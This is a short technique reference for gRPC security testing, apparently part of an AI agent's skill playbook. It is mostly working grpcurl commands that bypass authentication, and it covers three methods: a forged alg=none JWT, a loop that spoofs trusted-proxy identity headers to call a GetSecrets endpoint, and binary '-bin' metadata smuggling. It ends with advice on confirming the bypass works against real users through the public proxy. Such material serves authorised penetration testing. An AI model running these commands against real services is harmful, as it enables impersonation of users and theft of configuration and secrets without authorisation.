# HUNT-GRPC — gRPC Security — Technique reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete technique.

---

## Phase 4 — Authentication / Trust-Boundary Bypass



```bash

# (a) Forged bearer / alg=none JWT in the authorization metadata

grpcurl -plaintext $TARGET:50051 \

  -H "authorization: Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4iLCJzdWIiOiIxIn0." \

  -d '{}' admin.AdminService/GetConfig



# (b) Backend-trusts-proxy headers: many gRPC backends authenticate at Envoy and

#     then trust identity injected as metadata. If the edge does not STRIP these,

#     spoofing them = full impersonation. Test every plausible name:

for H in "x-user-id: 1" "x-authenticated-user: admin" "x-tenant-id: 0" \

         "x-internal-request: true" "x-forwarded-for: 127.0.0.1" \

         "x-envoy-internal: true" "grpc-internal-encoding-request: true"; do

  echo "== $H =="

  grpcurl -plaintext $TARGET:50051 -H "$H" -d '{}' internal.InternalService/GetSecrets 2>&1 | head -3

done



# (c) Binary metadata smuggling — keys ending in -bin are base64-decoded by the

#     server; some auth middlewares only inspect text metadata, missing -bin keys.

grpcurl -plaintext $TARGET:50051 -H "auth-token-bin: $(printf admin|base64)" \

  -d '{}' admin.AdminService/GetConfig

```



The metadata-stripping bug (b) is the gRPC-specific crown jewel: confirm it by sending the spoofed header **directly to the backend port** AND, separately, **through the public proxy** — if the proxy forwards your `x-user-id` unchanged to the backend, it is exploitable for real users, not just on the bypassed port.



---
